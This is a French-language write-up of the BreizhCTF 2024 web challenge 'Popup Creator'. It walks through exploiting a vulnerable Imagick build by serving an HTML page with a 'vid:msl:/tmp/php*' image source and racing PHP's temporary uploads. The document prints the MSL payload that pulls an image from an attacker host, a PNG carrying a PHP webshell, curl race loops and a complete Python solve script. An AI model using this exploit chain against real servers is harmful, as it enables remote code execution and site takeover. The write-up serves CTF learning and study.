+++
title = "Popup Creator"
description = "BreizhCTF 2024 - Web"
keywords = "Web, ImageTragick"
date = "2024-12-01T13:00:00+02:00"
weight = 20
draft = false
bref = "BreizhCTF 2024 - Web"
toc = true
cat = ["Web"]
+++

BreizhCTF 2024 - Popup Creator
==============================

### Challenge details

| Event          | Challenge     | Category | Points | Solves |
| -------------- | ------------- | -------- | ------ | ------ |
| BreizhCTF 2024 | Popup Creator | Web      | ???    | ???    |

...

Auteur : [Worty](https://twitter.com/_worty)

https://popupcreator.ctf.bzh/

### TL;DR

Le challenge repose sur une version vulnérable d'ImageMagick impliquant la vulnérabilité ImageTragick.
La mise en place d'un serveur web proposant une page HTML et une image

### Méthodologie

Les sources du challenge nous sont fournis. L'inspection du Dockerfile nous indique que la version d'Imagick est fixée : 

```bash
RUN mkdir -p /usr/src/php/ext/imagick && \
    curl -fsSL https://github.com/Imagick/imagick/archive/06116aa24b76edaf6b1693198f79e6c295eda8a9.tar.gz | tar xvz -C "/usr/src/php/ext/imagick" --strip 1 && \
    docker-php-ext-install imagick dom && \
    a2enmod rewrite && \
    mkdir /tmp/sessions && \
    chmod 777 /tmp/sessions/
```

Cette version d'Imagick est vulnérable à [ImageTragick](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/).

Le blogpost de [Swarm Pt Security](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) donne un exemple détaillé d'exploitation à base de fichier MSL.

Le prérequis d'exploitation se trouve dans le chargement d'une image avec `new Imagick($x)` où `$x` est une variable contrôlée. La fonctionnalité de création de PopUp fait appel à cette fonction selon le processus suivant :
1. Une URL contrôlée par l'attaquant est envoyée au travers du formulaire `/rate` (tapant le fichier `/fetcher/fetcher.php`)
2. Le contenu de l'URL est récupéré à l'aide de la fonction `file_get_contents()` et parsé a l'aide de `HtmlParser()` contenu dans `/fetcher/helpers/html_parser.php`.
3. `HtmlParser()` fait appel à `ImageParser()` (`/fetcher/helpers/image_parser.php`) au travers de sa méthode `HtmlParser:parse_html()` appelant `HtmlParser:get_images()` chargé de récupérer le contenu des `src` des balises `img`, et `ImageParser:parse_image()` itérant sur le tableau des `src` récupéré.
4. La méthode `ImageParser:parse_image()` instancie alors une `new Imagick($image)` pour chaque `src` récupérée de l'URL soumise au premier formulaire.

En respectant le blogpost de [Swarm Pt Security](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/), notre scénario d'attaque est donc le suivant :
1. Forger une page HTML faisant incluant une référence `<img src="vid:msl:/tmp/php*">` où `vid:msl:/tmp/php*` est notre paramètre malveillant passé à Imagick. Imagick va alors tenter de charger les images dont le nom est `/tmp/php*`.
2. On utilise le mécanisme d'upload de fichier par défaut de PHP pour créer un fichier ayant pour nom `/tmp/php*`. En effet, PHP accepte l'ensemble des fichiers le temps de son exécution et les sauvegarde sous la forme `/tmp/php[random]`. Une fois la fin de page exécutée, le fichier temporaire est supprimé.
3. Afin de maximiser les chances d'inclure notre fichier, on multiplie et parallélise les deux requêtes (race-condition avec multithreading).
4. Le contenu du fichier envoyé est un script MSL permettant la création d'un fichier.

#### Page HTML

Le fichier index.html est desservi sous une route joignable du container (ici `http://attacker/`), par exemple à l'aide d'un VPS, de [ngrok](https://ngrok.com/), [beeceptor](https://beeceptor.com/) ou encore [pastbin](https://pastebin.com/).

```html
<html>
    <head></head>
    <body>
        <img src="vid:msl:/tmp/php*">
    </body>
</html>
```

#### Image malveillante envoyée

L'image envoyée au format MSL (malveillant.msl) est la suivante. Ici le contenu de l'image `http://attacker/image.png` est réécrit par-dessus le fichier bugs.php (`www-data` ayant les droits d'écriture sur ce fichier).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
    <read filename="http://attacker/image.png" />
    <write filename="/var/www/html/bugs.php" />
</image>
```

#### Image.png

Pour maximiser les chances d'exploitation, l'image réécrite sur bugs.php doit être une image PNG valide avec un code PHP dans son contenu. L'utilisation d'une image minimaliste avec l'ajout du webshell dans les métadonnées ou l'ajout à la fin du fichier PNG permet de maximiser ces chances. Lien de l'image: [image.png](image.png).

L'image doit également être desservie sous l'URL `http://attacker/image.png`.

```bash
xxd image.png
```
```raw
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0001 0000 0001 0103 0000 0025 db56  .............%.V
00000020: ca00 0000 0467 414d 4100 00b1 8f0b fc61  .....gAMA......a
00000030: 0500 0000 2063 4852 4d00 007a 2600 0080  .... cHRM..z&...
00000040: 8400 00fa 0000 0080 e800 0075 3000 00ea  ...........u0...
00000050: 6000 003a 9800 0017 709c ba51 3c00 0000  `..:....p..Q<...
00000060: 0650 4c54 45ff 0000 ffff ff41 1d34 1100  .PLTE......A.4..
00000070: 0000 0162 4b47 4401 ff02 2dde 0000 0007  ...bKGD...-.....
00000080: 7449 4d45 07e7 0b07 0914 000c ed64 e800  tIME.........d..
00000090: 0000 0a49 4441 5408 d763 6000 0000 0200  ...IDAT..c`.....
000000a0: 01e2 21bc 3300 0000 3474 4558 7443 6f70  ..!.3...4tEXtCop
000000b0: 7972 6967 6874 003c 3f70 6870 2076 6172  yright.<?php var
000000c0: 5f64 756d 7028 7368 656c 6c5f 6578 6563  _dump(shell_exec
000000d0: 2824 5f47 4554 5b22 6322 5d29 293b 203f  ($_GET["c"])); ?
000000e0: 3eb6 f229 0e00 0000 2574 4558 7464 6174  >..)....%tEXtdat
000000f0: 653a 6372 6561 7465 0032 3032 332d 3131  e:create.2023-11
00000100: 2d30 3754 3039 3a32 303a 3030 2b30 303a  -07T09:20:00+00:
00000110: 3030 a561 3bf0 0000 0025 7445 5874 6461  00.a;....%tEXtda
00000120: 7465 3a6d 6f64 6966 7900 3230 3233 2d31  te:modify.2023-1
00000130: 312d 3037 5430 393a 3230 3a30 302b 3030  1-07T09:20:00+00
00000140: 3a30 30d4 3c83 4c00 0000 0049 454e 44ae  :00.<.L....IEND.
00000150: 4260 82                                  B`.
```

La backdoor PHP retenue est le code suivant :

```php
<?php
var_dump(shell_exec($_GET["c"]));
?>
```

#### Race-Condition

La première requête consistant à envoyer notre fichier malveillant.msl en boucle est la suivante :

```bash
while true; do curl -X POST "https://popupcreator.ctf.bzh/" -F 'file=@malveillant.msl'; done
```

*Note: Il est possible de multiplier le nombre de fichier en spécifiant plusieurs options -F*.

La deuxième requête consistant à déclencher notre appel à `Imagick()` est l'appel au fetcher suivant :

```bash
while true; do curl 'http://popupcreator.ctf.bzh/fetch' -X POST -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' --data-raw 'url=http%3A%2F%2Fattacker%2F'; done
```

Après quelques secondes, le fichier `bugs.php` est modifié et contient notre backdoor. On peut alors exécuter nos commandes à l'aide de l'URL http://popupcreator.ctf.bzh/bugs.php?c=id. 

Il suffit enfin de lire le fichier flag.txt au travers de la backdoor.


### Solve.py

Voici un script python permettant d'effectuer l'ensemble des opérations à l'aide d'une seule commande :

```python
#!/usr/bin/env python3

import argparse
import base64
import io
import requests
import time
from flask import Flask, send_file
from threading import Thread

MSL_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<image>
    <read filename="{URL}" />
    <write filename="/var/www/html/bugs.php" />
</image>"""

IMG_WEBSHELL = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABlBMVEX/AAD///9BHTQRAAAAAWJLR0QB/wIt3gAAAAd0SU1FB+cLBwkUAAztZOgAAAAKSURBVAjXY2AAAAACAAHiIbwzAAAANHRFWHRDb3B5cmlnaHQAPD9waHAgdmFyX2R1bXAoc2hlbGxfZXhlYygkX0dFVFsiYyJdKSk7ID8+tvIpDgAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMy0xMS0wN1QwOToyMDowMCswMDowMKVhO/AAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjMtMTEtMDdUMDk6MjA6MDArMDA6MDDUPINMAAAAAElFTkSuQmCC"

THREADS_NB = 1
REQ_PER_THREAD = 150

app = Flask(__name__)
@app.route('/')
def index():
    return '<html><head></head><body><img src="vid:msl:/tmp/php*"></body></html>'

@app.route('/image.png')
def image():
    image_binary = base64.b64decode(IMG_WEBSHELL)
    return send_file(io.BytesIO(image_binary), mimetype='image/jpeg', as_attachment=True, download_name='image.png')

def get_server_info():
    ip_port = argparse.ArgumentParser()
    ip_port.add_argument('url', help="URL of the challenge, ie. https://popupcreator.ctf.bzh/")
    ip_port.add_argument("-n",  default="172.0.0.1", help="IP of the listening webserver.")
    ip_port.add_argument("-p", type=int, default='8000', help="PORT of the listening webserver.")
    ip_port_parsed = ip_port.parse_args()
    return ip_port_parsed

def send_msl(url, local_server):
    print("[+] Send MSL to server")
    for i in range(100):
        try:
            payload = MSL_PAYLOAD.replace("{URL}", f"{local_server}image.png")
            files = {}
            for i in range(REQ_PER_THREAD):
                files[f"file{i}"] = payload
            requests.post(url, files=files)
        except:
            pass

def send_rate(url, local_server):
    print("[+] Send fetch request to server")
    for i in range(REQ_PER_THREAD):
        try:
            requests.post(f"{url}/fetch", data={"url": local_server})
        except:
            pass

if __name__ == "__main__":
    infos = get_server_info()
    local_server = f"http://{infos.n}:{infos.p}/"
    app_thread = Thread(target=lambda: app.run(host=infos.n, port=infos.p, use_reloader=False))
    app_thread.setDaemon(True)
    app_thread.start()

    time.sleep(1)

    l1, l2 = [], []
    for i in range(THREADS_NB):  # preload race
        l1.append(Thread(target=lambda: send_msl(infos.url, local_server)))
        l2.append(Thread(target=lambda: send_rate(infos.url, local_server)))

    for i in range(THREADS_NB):  # run race
        l1[i].start()
        l2[i].start()

    for t in range(THREADS_NB):  # Wait for end of thread
        l1[i].join()
        l2[i].join()

    exec_url = f"{infos.url}bugs.php?c=id"
    r = requests.get(exec_url)

    if "www-data" in r.text:
        print(f"[+] Got www-data for URL {exec_url}")
    else:
        print(f"[+] Cannot win race for URL {exec_url}")
```

### Resources

https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/

#### Flag

`BZHCTF{1m4g1ck_1s_tr4g1ck_4g41n_!!}`

Auteur du challenge : [Worty](https://twitter.com/_worty)